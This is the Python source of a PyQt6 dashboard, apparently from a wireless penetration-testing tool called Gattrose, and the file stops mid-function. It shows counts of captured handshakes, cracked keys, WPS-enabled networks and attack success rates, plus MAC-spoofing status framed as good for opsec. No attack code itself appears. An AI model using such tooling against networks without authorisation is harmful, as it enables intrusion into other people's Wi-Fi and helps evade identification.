"""
Main Qt6 application window for Gattrose
Professional wireless penetration testing interface
"""

import sys
import csv
import glob
import re
from pathlib import Path
from datetime import datetime
from typing import Optional
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QTabWidget, QTabBar, QLabel, QPushButton, QStatusBar, QMenuBar,
    QMenu, QToolBar, QTextEdit, QSplitter, QMessageBox,
    QComboBox, QGroupBox, QFormLayout, QScrollArea,
    QTreeWidget, QTreeWidgetItem, QTreeWidgetItemIterator, QGridLayout,
    QLineEdit, QSlider, QProgressBar, QInputDialog, QFileDialog, QCheckBox, QSpinBox
)
from PyQt6.QtCore import Qt, QTimer, QThread, pyqtSignal
from PyQt6.QtGui import QAction, QIcon, QFont

from .theme import get_theme, get_theme_list, THEMES
from .dynamic_theme import DynamicTheme


class StatusMonitor(QThread):
    """Background thread for monitoring system status"""
    status_updated = pyqtSignal(object)

    def __init__(self):
        super().__init__()
        self.running = True

    def run(self):
        """Monitor system status"""
        while self.running:
            # Get system status (network interfaces, etc.)
            status = self._get_status()
            self.status_updated.emit(status)
            self.msleep(2000)  # Update every 2 seconds

    def _get_status(self) -> dict:
        """Get current system status"""
        try:
            import psutil
            import netifaces

            # Get network interfaces
            interfaces = netifaces.interfaces()

            # Get wireless interfaces (basic check - proper detection in tools module)
            wireless_ifaces = [iface for iface in interfaces if iface.startswith('wlan') or iface.startswith('wl')]

            return {
                'time': datetime.now().strftime('%H:%M:%S'),
                'cpu': psutil.cpu_percent(interval=0.1),
                'mem': psutil.virtual_memory().percent,
                'interfaces': len(interfaces),
                'wireless': len(wireless_ifaces)
            }
        except Exception as e:
            return {
                'time': datetime.now().strftime('%H:%M:%S'),
                'error': str(e)
            }

    def stop(self):
        """Stop monitoring"""
        self.running = False


class ClickableGroupBox(QGroupBox):
    """Clickable QGroupBox for dashboard stats"""

    def __init__(self, title, click_callback=None, parent=None):
        super().__init__(title, parent)
        self.click_callback = click_callback
        self.setCursor(Qt.CursorShape.PointingHandCursor)
        self.setStyleSheet("""
            ClickableGroupBox:hover {
                background-color: rgba(255, 255, 255, 0.1);
                border: 2px solid #0088ff;
            }
        """)

    def mousePressEvent(self, event):
        """Handle mouse click"""
        if event.button() == Qt.MouseButton.LeftButton and self.click_callback:
            self.click_callback()
        super().mousePressEvent(event)


class DashboardTab(QWidget):
    """Dashboard/Overview tab - Comprehensive statistics and running tasks"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.main_window = None
        self.scanner_tab = None
        self.refresh_timer = None
        self.mac_spoofing_timer = None
        self.mac_flash_state = False
        self.init_ui()
        self.start_auto_refresh()
        self.start_mac_status_updates()

    def init_ui(self):
        """Initialize comprehensive dashboard UI with overwhelming amount of data"""
        # Use scroll area for all the data
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)

        container = QWidget()
        layout = QVBoxLayout()

        # ========== HEADER WITH OS INFO ==========
        header_layout = QHBoxLayout()
        header = QLabel("📊 Dashboard - System Overview")
        header.setProperty("heading", True)
        header_layout.addWidget(header)
        header_layout.addStretch()

        # OS detection info
        self.os_info_label = QLabel("OS: Detecting...")
        self.os_info_label.setStyleSheet("font-size: 12px; color: #00ff88; font-weight: bold;")
        header_layout.addWidget(self.os_info_label)

        layout.addLayout(header_layout)

        # ========== STATISTICS CARDS ROW 1 (CLICKABLE) ==========
        stats_row1 = QHBoxLayout()

        # Networks discovered card (click to go to Scanner tab)
        networks_group = ClickableGroupBox("📡 Networks Discovered", self.on_networks_clicked)
        networks_layout = QVBoxLayout()
        self.networks_count_label = QLabel("0")
        self.networks_count_label.setStyleSheet("font-size: 32px; font-weight: bold; color: #00ff00;")
        self.networks_count_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        networks_layout.addWidget(self.networks_count_label)
        self.networks_detail_label = QLabel("Total APs scanned\n(Click to view)")
        self.networks_detail_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.networks_detail_label.setStyleSheet("font-size: 10px; color: #888;")
        networks_layout.addWidget(self.networks_detail_label)
        networks_group.setLayout(networks_layout)
        stats_row1.addWidget(networks_group)

        # Clients discovered card (click to go to Scanner tab)
        clients_group = ClickableGroupBox("👥 Clients Discovered", self.on_clients_clicked)
        clients_layout = QVBoxLayout()
        self.clients_count_label = QLabel("0")
        self.clients_count_label.setStyleSheet("font-size: 32px; font-weight: bold; color: #00aaff;")
        self.clients_count_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        clients_layout.addWidget(self.clients_count_label)
        self.clients_detail_label = QLabel("Unique devices\n(Click to view)")
        self.clients_detail_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.clients_detail_label.setStyleSheet("font-size: 10px; color: #888;")
        clients_layout.addWidget(self.clients_detail_label)
        clients_group.setLayout(clients_layout)
        stats_row1.addWidget(clients_group)

        # Handshakes captured card (click to go to Database tab)
        handshakes_group = ClickableGroupBox("🤝 Handshakes", self.on_handshakes_clicked)
        handshakes_layout = QVBoxLayout()
        self.handshakes_count_label = QLabel("0")
        self.handshakes_count_label.setStyleSheet("font-size: 32px; font-weight: bold; color: #ffaa00;")
        self.handshakes_count_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        handshakes_layout.addWidget(self.handshakes_count_label)
        self.handshakes_detail_label = QLabel("Captured\n(Click to view)")
        self.handshakes_detail_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.handshakes_detail_label.setStyleSheet("font-size: 10px; color: #888;")
        handshakes_layout.addWidget(self.handshakes_detail_label)
        handshakes_group.setLayout(handshakes_layout)
        stats_row1.addWidget(handshakes_group)

        # Keys cracked card (click to go to Database tab with cracked filter)
        keys_group = ClickableGroupBox("🔑 Keys Cracked", self.on_keys_clicked)
        keys_layout = QVBoxLayout()
        self.keys_count_label = QLabel("0")
        self.keys_count_label.setStyleSheet("font-size: 32px; font-weight: bold; color: #ff0088;")
        self.keys_count_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        keys_layout.addWidget(self.keys_count_label)
        self.keys_detail_label = QLabel("Passwords recovered\n(Click to view)")
        self.keys_detail_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.keys_detail_label.setStyleSheet("font-size: 10px; color: #888;")
        keys_layout.addWidget(self.keys_detail_label)
        keys_group.setLayout(keys_layout)
        stats_row1.addWidget(keys_group)

        # Serialized items card (click for details popup)
        serialized_group = ClickableGroupBox("🔢 Serialized Items", self.on_serialized_clicked)
        serialized_layout = QVBoxLayout()
        self.serialized_count_label = QLabel("0")
        self.serialized_count_label.setStyleSheet("font-size: 32px; font-weight: bold; color: #aa00ff;")
        self.serialized_count_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        serialized_layout.addWidget(self.serialized_count_label)
        self.serialized_detail_label = QLabel("Unique serial numbers\n(Click for details)")
        self.serialized_detail_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.serialized_detail_label.setStyleSheet("font-size: 10px; color: #888;")
        serialized_layout.addWidget(self.serialized_detail_label)
        serialized_group.setLayout(serialized_layout)
        stats_row1.addWidget(serialized_group)

        # Manufacturers/OUI database card (non-clickable info card)
        manufacturers_group = QGroupBox("🏭 Manufacturers")
        manufacturers_layout = QVBoxLayout()
        self.manufacturers_count_label = QLabel("0")
        self.manufacturers_count_label.setStyleSheet("font-size: 32px; font-weight: bold; color: #ffcc00;")
        self.manufacturers_count_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        manufacturers_layout.addWidget(self.manufacturers_count_label)
        self.manufacturers_detail_label = QLabel("MAC vendors in OUI DB")
        self.manufacturers_detail_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.manufacturers_detail_label.setStyleSheet("font-size: 10px; color: #888;")
        manufacturers_layout.addWidget(self.manufacturers_detail_label)
        manufacturers_group.setLayout(manufacturers_layout)
        stats_row1.addWidget(manufacturers_group)

        layout.addLayout(stats_row1)

        # ========== RUNNING TASKS ==========
        tasks_group = QGroupBox("⚙️ Running Tasks & Processes")
        tasks_layout = QVBoxLayout()

        # Scanner status
        scanner_status_layout = QHBoxLayout()
        scanner_status_layout.addWidget(QLabel("Scanner:"))
        self.scanner_status_label = QLabel("⏸️ Idle")
        scanner_status_layout.addWidget(self.scanner_status_label)
        self.scanner_progress = QProgressBar()
        self.scanner_progress.setMaximum(100)
        self.scanner_progress.setValue(0)
        scanner_status_layout.addWidget(self.scanner_progress)
        tasks_layout.addLayout(scanner_status_layout)

        # Database worker status
        db_worker_status_layout = QHBoxLayout()
        db_worker_status_layout.addWidget(QLabel("Database Worker:"))
        self.db_worker_status_label = QLabel("⏸️ Idle")
        db_worker_status_layout.addWidget(self.db_worker_status_label)
        self.db_worker_progress = QProgressBar()
        self.db_worker_progress.setMaximum(100)
        self.db_worker_progress.setValue(0)
        db_worker_status_layout.addWidget(self.db_worker_progress)
        tasks_layout.addLayout(db_worker_status_layout)

        # Active attacks
        attacks_status_layout = QHBoxLayout()
        attacks_status_layout.addWidget(QLabel("Active Attacks:"))
        self.attacks_status_label = QLabel("0 running")
        attacks_status_layout.addWidget(self.attacks_status_label)
        attacks_status_layout.addStretch()
        tasks_layout.addLayout(attacks_status_layout)

        tasks_group.setLayout(tasks_layout)
        layout.addWidget(tasks_group)

        # ========== ATTACK QUEUE (COMPACT VIEW) ==========
        from .widgets.attack_queue_widget import CompactAttackQueueWidget
        self.compact_queue = CompactAttackQueueWidget()
        layout.addWidget(self.compact_queue)

        # ========== DATABASE STATISTICS (ALL CLICKABLE) ==========
        db_stats_row = QHBoxLayout()

        # Encryption breakdown (click to go to Database with encryption filter)
        encryption_group = ClickableGroupBox("🔐 Encryption Types", self.on_encryption_clicked)
        encryption_group.setToolTip("Click to view networks by encryption type in Database")
        encryption_layout = QVBoxLayout()
        self.wpa3_label = QLabel("WPA3: 0")
        self.wpa2_label = QLabel("WPA2: 0")
        self.wpa_label = QLabel("WPA: 0")
        self.wep_label = QLabel("WEP: 0")
        self.open_label = QLabel("Open: 0")
        encryption_layout.addWidget(self.wpa3_label)
        encryption_layout.addWidget(self.wpa2_label)
        encryption_layout.addWidget(self.wpa_label)
        encryption_layout.addWidget(self.wep_label)
        encryption_layout.addWidget(self.open_label)
        encryption_layout.addWidget(QLabel("(Click to filter)"))
        encryption_group.setLayout(encryption_layout)
        db_stats_row.addWidget(encryption_group)

        # WPS statistics (click to go to WPS Networks tab)
        wps_group = ClickableGroupBox("📶 WPS Status", self.on_wps_clicked)
        wps_group.setToolTip("Click to view WPS-enabled networks")
        wps_layout = QVBoxLayout()
        self.wps_enabled_label = QLabel("WPS Enabled: 0")
        self.wps_locked_label = QLabel("WPS Locked: 0")
        self.wps_percentage_label = QLabel("0% have WPS")
        wps_layout.addWidget(self.wps_enabled_label)
        wps_layout.addWidget(self.wps_locked_label)
        wps_layout.addWidget(self.wps_percentage_label)
        wps_layout.addWidget(QLabel("(Click to view)"))
        wps_layout.addStretch()
        wps_group.setLayout(wps_layout)
        db_stats_row.addWidget(wps_group)

        # System information
        system_group = QGroupBox("💻 System Status")
        system_layout = QVBoxLayout()
        self.monitor_interface_label = QLabel("Monitor Mode: Initializing...")

        # MAC spoofing with button
        mac_layout = QHBoxLayout()
        self.mac_spoofing_label = QLabel("MAC Address: Checking...")
        self.mac_spoofing_label.setStyleSheet("font-weight: bold;")
        mac_layout.addWidget(self.mac_spoofing_label)

        self.spoof_mac_button = QPushButton("Acquire New MAC")
        self.spoof_mac_button.setToolTip("Acquire a new randomized MAC address")
        self.spoof_mac_button.setMaximumWidth(160)
        self.spoof_mac_button.clicked.connect(self.on_spoof_mac_clicked)
        mac_layout.addWidget(self.spoof_mac_button)

        self.restore_mac_button = QPushButton("Restore")
        self.restore_mac_button.setToolTip("Restore permanent hardware MAC address")
        self.restore_mac_button.clicked.connect(self.on_restore_mac_clicked)
        mac_layout.addWidget(self.restore_mac_button)
        mac_layout.addStretch()

        self.location_service_label = QLabel("Location: Disabled")
        self.database_size_label = QLabel("Database: 0 MB")
        system_layout.addWidget(self.monitor_interface_label)
        system_layout.addLayout(mac_layout)
        system_layout.addWidget(self.location_service_label)
        system_layout.addWidget(self.database_size_label)
        system_layout.addStretch()
        system_group.setLayout(system_layout)
        db_stats_row.addWidget(system_group)

        layout.addLayout(db_stats_row)

        # ========== TIME-BASED STATISTICS (INTERACTIVE) ==========
        time_stats_row = QHBoxLayout()

        # Today's stats (click to filter by today)
        today_group = ClickableGroupBox("📅 Today", self.on_today_clicked)
        today_group.setToolTip("Click to view today's discoveries")
        today_layout = QVBoxLayout()
        self.today_networks_label = QLabel("Networks: 0")
        self.today_clients_label = QLabel("Clients: 0")
        self.today_handshakes_label = QLabel("Handshakes: 0")
        self.today_cracked_label = QLabel("Cracked: 0")
        today_layout.addWidget(self.today_networks_label)
        today_layout.addWidget(self.today_clients_label)
        today_layout.addWidget(self.today_handshakes_label)
        today_layout.addWidget(self.today_cracked_label)
        today_layout.addWidget(QLabel("(Click to view)"))
        today_group.setLayout(today_layout)
        time_stats_row.addWidget(today_group)

        # This week's stats (click to filter by this week)
        week_group = ClickableGroupBox("📆 This Week", self.on_week_clicked)
        week_group.setToolTip("Click to view this week's discoveries")
        week_layout = QVBoxLayout()
        self.week_networks_label = QLabel("Networks: 0")
        self.week_clients_label = QLabel("Clients: 0")
        self.week_handshakes_label = QLabel("Handshakes: 0")
        self.week_cracked_label = QLabel("Cracked: 0")
        week_layout.addWidget(self.week_networks_label)
        week_layout.addWidget(self.week_clients_label)
        week_layout.addWidget(self.week_handshakes_label)
        week_layout.addWidget(self.week_cracked_label)
        week_layout.addWidget(QLabel("(Click to view)"))
        week_group.setLayout(week_layout)
        time_stats_row.addWidget(week_group)

        # This month's stats (click to filter by this month)
        month_group = ClickableGroupBox("📊 This Month", self.on_month_clicked)
        month_group.setToolTip("Click to view this month's discoveries")
        month_layout = QVBoxLayout()
        self.month_networks_label = QLabel("Networks: 0")
        self.month_clients_label = QLabel("Clients: 0")
        self.month_handshakes_label = QLabel("Handshakes: 0")
        self.month_cracked_label = QLabel("Cracked: 0")
        month_layout.addWidget(self.month_networks_label)
        month_layout.addWidget(self.month_clients_label)
        month_layout.addWidget(self.month_handshakes_label)
        month_layout.addWidget(self.month_cracked_label)
        month_layout.addWidget(QLabel("(Click to view)"))
        month_group.setLayout(month_layout)
        time_stats_row.addWidget(month_group)

        # All-time stats
        alltime_group = QGroupBox("♾️ All Time")
        alltime_layout = QVBoxLayout()
        self.alltime_networks_label = QLabel("Networks: 0")
        self.alltime_clients_label = QLabel("Clients: 0")
        self.alltime_handshakes_label = QLabel("Handshakes: 0")
        self.alltime_cracked_label = QLabel("Cracked: 0")
        alltime_layout.addWidget(self.alltime_networks_label)
        alltime_layout.addWidget(self.alltime_clients_label)
        alltime_layout.addWidget(self.alltime_handshakes_label)
        alltime_layout.addWidget(self.alltime_cracked_label)
        alltime_group.setLayout(alltime_layout)
        time_stats_row.addWidget(alltime_group)

        layout.addLayout(time_stats_row)

        # ========== CHANNEL DISTRIBUTION (INTERACTIVE) ==========
        channel_group = ClickableGroupBox("📻 Channel Distribution", self.on_channels_clicked)
        channel_group.setToolTip("Click to view networks by channel")
        channel_layout = QGridLayout()

        # Create labels for 2.4GHz and 5GHz channels
        self.channel_labels = {}
        row, col = 0, 0
        for ch in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,  # 2.4GHz
                   36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144,  # 5GHz
                   149, 153, 157, 161, 165]:
            label = QLabel(f"Ch {ch}: 0")
            label.setStyleSheet("font-size: 9px;")
            self.channel_labels[ch] = label
            channel_layout.addWidget(label, row, col)
            col += 1
            if col > 6:
                col = 0
                row += 1

        channel_group.setLayout(channel_layout)
        layout.addWidget(channel_group)

        # ========== TOP MANUFACTURERS & SIGNAL STATS (INTERACTIVE) ==========
        mfr_signal_row = QHBoxLayout()

        # Top manufacturers (click to view networks by manufacturer)
        manufacturers_group = ClickableGroupBox("🏭 Top Manufacturers", self.on_manufacturers_clicked)
        manufacturers_group.setToolTip("Click to view networks by manufacturer")
        manufacturers_layout = QVBoxLayout()
        self.top_mfr_labels = []
        for i in range(10):
            label = QLabel(f"{i+1}. Loading...")
            label.setStyleSheet("font-size: 10px;")
            self.top_mfr_labels.append(label)
            manufacturers_layout.addWidget(label)
        manufacturers_group.setLayout(manufacturers_layout)
        mfr_signal_row.addWidget(manufacturers_group)

        # Signal strength distribution (click to view by signal)
        signal_group = ClickableGroupBox("📶 Signal Strength", self.on_signal_clicked)
        signal_group.setToolTip("Click to view networks by signal strength")
        signal_layout = QVBoxLayout()
        self.signal_excellent_label = QLabel("Excellent (> -50dBm): 0")
        self.signal_good_label = QLabel("Good (-50 to -60dBm): 0")
        self.signal_fair_label = QLabel("Fair (-60 to -70dBm): 0")
        self.signal_weak_label = QLabel("Weak (-70 to -80dBm): 0")
        self.signal_poor_label = QLabel("Poor (< -80dBm): 0")
        self.signal_avg_label = QLabel("Average: N/A")
        signal_layout.addWidget(self.signal_excellent_label)
        signal_layout.addWidget(self.signal_good_label)
        signal_layout.addWidget(self.signal_fair_label)
        signal_layout.addWidget(self.signal_weak_label)
        signal_layout.addWidget(self.signal_poor_label)
        signal_layout.addWidget(QLabel(""))
        signal_layout.addWidget(self.signal_avg_label)
        signal_layout.addWidget(QLabel("(Click to view)"))
        signal_group.setLayout(signal_layout)
        mfr_signal_row.addWidget(signal_group)

        # Hidden vs visible networks (click to view hidden)
        hidden_group = ClickableGroupBox("🔍 Network Visibility", self.on_hidden_clicked)
        hidden_group.setToolTip("Click to view hidden networks")
        hidden_layout = QVBoxLayout()
        self.visible_networks_label = QLabel("Visible SSIDs: 0")
        self.hidden_networks_label = QLabel("Hidden SSIDs: 0")
        self.hidden_percentage_label = QLabel("0% hidden")
        hidden_layout.addWidget(self.visible_networks_label)
        hidden_layout.addWidget(self.hidden_networks_label)
        hidden_layout.addWidget(self.hidden_percentage_label)
        hidden_layout.addWidget(QLabel(""))
        hidden_layout.addWidget(QLabel("(Click to filter)"))
        hidden_layout.addStretch()
        hidden_group.setLayout(hidden_layout)
        mfr_signal_row.addWidget(hidden_group)

        layout.addLayout(mfr_signal_row)

        # ========== SYSTEM RESOURCES (INTERACTIVE) ==========
        resources_row = QHBoxLayout()

        # CPU & Memory (click to view system monitor)
        system_resources_group = ClickableGroupBox("💻 System Resources", self.on_resources_clicked)
        system_resources_group.setToolTip("Click for detailed system monitor")
        resources_layout = QVBoxLayout()
        self.cpu_usage_label = QLabel("CPU: Checking...")
        self.ram_usage_label = QLabel("RAM: Checking...")
        self.disk_usage_label = QLabel("Disk: Checking...")
        self.system_uptime_label = QLabel("Uptime: Checking...")
        resources_layout.addWidget(self.cpu_usage_label)
        resources_layout.addWidget(self.ram_usage_label)
        resources_layout.addWidget(self.disk_usage_label)
        resources_layout.addWidget(self.system_uptime_label)
        resources_layout.addWidget(QLabel("(Click for details)"))
        system_resources_group.setLayout(resources_layout)
        resources_row.addWidget(system_resources_group)

        # Attack success rates (click to view attack history)
        attack_stats_group = ClickableGroupBox("🎯 Attack Statistics", self.on_attack_stats_clicked)
        attack_stats_group.setToolTip("Click to view attack history")
        attack_stats_layout = QVBoxLayout()
        self.attacks_attempted_label = QLabel("Attempted: 0")
        self.attacks_successful_label = QLabel("Successful: 0")
        self.attacks_failed_label = QLabel("Failed: 0")
        self.attack_success_rate_label = QLabel("Success Rate: 0%")
        self.avg_crack_time_label = QLabel("Avg Crack Time: N/A")
        attack_stats_layout.addWidget(self.attacks_attempted_label)
        attack_stats_layout.addWidget(self.attacks_successful_label)
        attack_stats_layout.addWidget(self.attacks_failed_label)
        attack_stats_layout.addWidget(self.attack_success_rate_label)
        attack_stats_layout.addWidget(self.avg_crack_time_label)
        attack_stats_layout.addWidget(QLabel("(Click to view)"))
        attack_stats_group.setLayout(attack_stats_layout)
        resources_row.addWidget(attack_stats_group)

        # File statistics (click to view captures folder)
        file_stats_group = ClickableGroupBox("📁 Captured Files", self.on_files_clicked)
        file_stats_group.setToolTip("Click to open captures folder")
        file_stats_layout = QVBoxLayout()
        self.handshake_files_label = QLabel("Handshake files: 0")
        self.service_files_label = QLabel("Service files: 0")
        self.total_capture_size_label = QLabel("Total size: 0 MB")
        self.oldest_capture_label = QLabel("Oldest: N/A")
        self.newest_capture_label = QLabel("Newest: N/A")
        file_stats_layout.addWidget(self.handshake_files_label)
        file_stats_layout.addWidget(self.service_files_label)
        file_stats_layout.addWidget(self.total_capture_size_label)
        file_stats_layout.addWidget(self.oldest_capture_label)
        file_stats_layout.addWidget(self.newest_capture_label)
        file_stats_layout.addWidget(QLabel("(Click to open)"))
        file_stats_group.setLayout(file_stats_layout)
        resources_row.addWidget(file_stats_group)

        layout.addLayout(resources_row)

        # ========== RECENT SCANS (INTERACTIVE) ==========
        scans_group = ClickableGroupBox("🔍 Recent Scan Sessions", self.on_scans_clicked)
        scans_group.setToolTip("Click to view all scan sessions")
        scans_layout = QVBoxLayout()
        self.recent_scans_list = QTextEdit()
        self.recent_scans_list.setReadOnly(True)
        self.recent_scans_list.setMaximumHeight(100)
        self.recent_scans_list.setFontFamily("monospace")
        scans_layout.addWidget(self.recent_scans_list)
        scans_layout.addWidget(QLabel("(Click to view all sessions)"))
        scans_group.setLayout(scans_layout)
        layout.addWidget(scans_group)

        # ========== TOP SSIDs (INTERACTIVE) ==========
        ssid_row = QHBoxLayout()

        # Most common SSIDs (click to view networks with that SSID)
        top_ssids_group = ClickableGroupBox("📡 Most Common SSIDs", self.on_top_ssids_clicked)
        top_ssids_group.setToolTip("Click to view networks by SSID")
        top_ssids_layout = QVBoxLayout()
        self.top_ssid_labels = []
        for i in range(10):
            label = QLabel(f"{i+1}. Loading...")
            label.setStyleSheet("font-size: 10px;")
            self.top_ssid_labels.append(label)
            top_ssids_layout.addWidget(label)
        top_ssids_group.setLayout(top_ssids_layout)
        ssid_row.addWidget(top_ssids_group)

        # Unique vs duplicate SSIDs
        ssid_stats_group = QGroupBox("📊 SSID Statistics")
        ssid_stats_layout = QVBoxLayout()
        self.unique_ssids_label = QLabel("Unique SSIDs: 0")
        self.duplicate_ssids_label = QLabel("Duplicate SSIDs: 0")
        self.total_ssids_label = QLabel("Total: 0")
        self.avg_aps_per_ssid_label = QLabel("Avg APs/SSID: 0")
        ssid_stats_layout.addWidget(self.unique_ssids_label)
        ssid_stats_layout.addWidget(self.duplicate_ssids_label)
        ssid_stats_layout.addWidget(self.total_ssids_label)
        ssid_stats_layout.addWidget(self.avg_aps_per_ssid_label)
        ssid_stats_layout.addStretch()
        ssid_stats_group.setLayout(ssid_stats_layout)
        ssid_row.addWidget(ssid_stats_group)

        layout.addLayout(ssid_row)

        # ========== ACTIVITY LOG ==========
        log_group = QGroupBox("📋 Recent Activity")
        log_layout = QVBoxLayout()

        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        self.log_text.setMaximumHeight(150)
        self.log_text.setFontFamily("monospace")
        log_layout.addWidget(self.log_text)

        log_group.setLayout(log_layout)
        layout.addWidget(log_group)

        layout.addStretch()

        # Wrap everything in scroll area
        container.setLayout(layout)
        scroll.setWidget(container)

        # Set scroll area as main layout
        main_layout = QVBoxLayout()
        main_layout.addWidget(scroll)
        self.setLayout(main_layout)

        # Initial log message
        self.log("🐊 Gattrose-NG Dashboard initialized")
        self.log("Waiting for system to start...")

        # Initial refresh
        self.refresh_statistics()
        self.refresh_extended_stats()

    def start_auto_refresh(self):
        """Start automatic statistics refresh"""
        if not self.refresh_timer:
            self.refresh_timer = QTimer()
            self.refresh_timer.timeout.connect(self.refresh_all_stats)
            self.refresh_timer.start(5000)  # 5 seconds

    def refresh_all_stats(self):
        """Refresh both standard and extended statistics"""
        self.refresh_statistics()
        self.refresh_extended_stats()
        self.load_os_info()

    def stop_auto_refresh(self):
        """Stop automatic statistics refresh"""
        if self.refresh_timer:
            self.refresh_timer.stop()

    def start_mac_status_updates(self):
        """Start MAC spoofing status monitoring with flashing effect"""
        if not self.mac_spoofing_timer:
            from PyQt6.QtCore import QTimer
            self.mac_spoofing_timer = QTimer()
            self.mac_spoofing_timer.timeout.connect(self.update_mac_spoofing_status)
            self.mac_spoofing_timer.start(500)  # Update every 500ms for flashing effect

    def stop_mac_status_updates(self):
        """Stop MAC spoofing status monitoring"""
        if self.mac_spoofing_timer:
            self.mac_spoofing_timer.stop()

    def toggle_auto_refresh(self, state):
        """Toggle auto-refresh on/off"""
        if state == 2:  # Qt.Checked
            self.start_auto_refresh()
        else:
            self.stop_auto_refresh()

    def refresh_statistics(self):
        """Refresh all statistics from database and running processes"""
        try:
            from src.database.models import get_session, Network, Client, Handshake

            session = get_session()

            # Get counts
            total_networks = session.query(Network).count()
            total_clients = session.query(Client).count()
            total_handshakes = session.query(Handshake).count()
            total_cracked = session.query(Handshake).filter(Handshake.is_cracked == True).count()

            # Count unique serial numbers across all tables
            # Currently only Networks have serial numbers
            serialized_count = session.query(Network.serial).filter(Network.serial.isnot(None)).distinct().count()

            # Count manufacturers in OUI database
            from src.database.models import OUIDatabase
            manufacturers_count = session.query(OUIDatabase).count()

            # Update main counters
            self.networks_count_label.setText(str(total_networks))
            self.clients_count_label.setText(str(total_clients))
            self.handshakes_count_label.setText(str(total_handshakes))
            self.keys_count_label.setText(str(total_cracked))
            self.serialized_count_label.setText(str(serialized_count))
            self.manufacturers_count_label.setText(f"{manufacturers_count:,}")

            # Encryption breakdown
            wpa3_count = session.query(Network).filter(Network.encryption.like('%WPA3%')).count()
            wpa2_count = session.query(Network).filter(Network.encryption.like('%WPA2%')).count()
            wpa_count = session.query(Network).filter(Network.encryption.like('%WPA%')).filter(~Network.encryption.like('%WPA2%')).filter(~Network.encryption.like('%WPA3%')).count()
            wep_count = session.query(Network).filter(Network.encryption.like('%WEP%')).count()
            open_count = session.query(Network).filter((Network.encryption == 'Open') | (Network.encryption == 'OPN') | (Network.encryption == '')).count()

            self.wpa3_label.setText(f"WPA3: {wpa3_count}")
            self.wpa2_label.setText(f"WPA2: {wpa2_count}")
            self.wpa_label.setText(f"WPA: {wpa_count}")
            self.wep_label.setText(f"WEP: {wep_count}")
            self.open_label.setText(f"Open: {open_count}")

            # WPS statistics
            wps_enabled = session.query(Network).filter(Network.wps_enabled == True).count()
            wps_locked = session.query(Network).filter(Network.wps_locked == True).count()
            wps_percentage = (wps_enabled / total_networks * 100) if total_networks > 0 else 0

            self.wps_enabled_label.setText(f"WPS Enabled: {wps_enabled}")
            self.wps_locked_label.setText(f"WPS Locked: {wps_locked}")
            self.wps_percentage_label.setText(f"{wps_percentage:.1f}% have WPS")

            # Database size
            from pathlib import Path
            db_path = Path.cwd() / "data" / "database" / "gattrose.db"
            if db_path.exists():
                db_size_mb = db_path.stat().st_size / (1024 * 1024)
                self.database_size_label.setText(f"Database: {db_size_mb:.2f} MB")

            session.close()

        except Exception as e:
            print(f"[ERROR] Failed to refresh dashboard statistics: {e}")
            import traceback
            traceback.print_exc()

    def set_main_window(self, main_window):
        """Set reference to main window"""
        self.main_window = main_window

    def set_scanner_tab(self, scanner_tab):
        """Set reference to scanner tab"""
        self.scanner_tab = scanner_tab

    def reset_database(self):
        """Delete and reinitialize the database"""
        reply = QMessageBox.question(
            self,
            "⚠️ Confirm Database Reset",
            "Are you sure you want to DELETE ALL scan data and reinitialize the database?\n\n"
            "This action CANNOT be undone!\n\n"
            "All networks, clients, handshakes, and scan sessions will be permanently deleted.",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            QMessageBox.StandardButton.No
        )

        if reply == QMessageBox.StandardButton.Yes:
            try:
                from pathlib import Path
                from src.database.models import init_db

                # Close any existing database connections
                from src.database.models import get_session
                try:
                    session = get_session()
                    session.close()
                except:
                    pass

                # Delete database file
                db_path = Path.cwd() / "data" / "database" / "gattrose.db"
                if db_path.exists():
                    db_path.unlink()
                    self.log("🗑️ Database file deleted")

                # Reinitialize database
                init_db()
                self.log("✅ Database reinitialized successfully")

                # Refresh statistics
                self.refresh_statistics()

                QMessageBox.information(
                    self,
                    "✅ Database Reset Complete",
                    "Database has been deleted and reinitialized.\n\n"
                    "All previous data has been removed."
                )

            except Exception as e:
                self.log(f"❌ Database reset failed: {e}")
                QMessageBox.critical(
                    self,
                    "❌ Database Reset Failed",
                    f"Failed to reset database:\n\n{e}"
                )
                import traceback
                traceback.print_exc()

    def log(self, message: str):
        """Add message to log"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.append(f"[{timestamp}] {message}")

    def update_mac_spoofing_status(self):
        """Check MAC spoofing status and update label with color coding"""
        try:
            from src.utils.mac_spoof import MACSpoofing

            # Get primary wireless interface (not monitor interface)
            # Check common wireless interface names
            interface = None
            for iface_name in ['wlan0', 'wlp7s0', 'wlp3s0', 'wlan1']:
                try:
                    with open(f'/sys/class/net/{iface_name}/address', 'r') as f:
                        interface = iface_name
                        break
                except FileNotFoundError:
                    continue

            if not interface:
                self.mac_spoofing_label.setText("MAC: No WiFi interface")
                self.mac_spoofing_label.setStyleSheet("font-weight: bold; color: gray;")
                return

            # Check if MAC is spoofed using utility
            is_spoofed, current_mac, perm_mac = MACSpoofing.is_mac_spoofed(interface)

            if not current_mac:
                current_mac = "Unknown"
            if not perm_mac:
                perm_mac = "Unknown"

            if is_spoofed:
                # GREEN - MAC is spoofed (good for opsec)
                self.mac_spoofing_label.setText(f"MAC: ✓ Spoofed\n{current_mac}\n(Real: {perm_mac})")
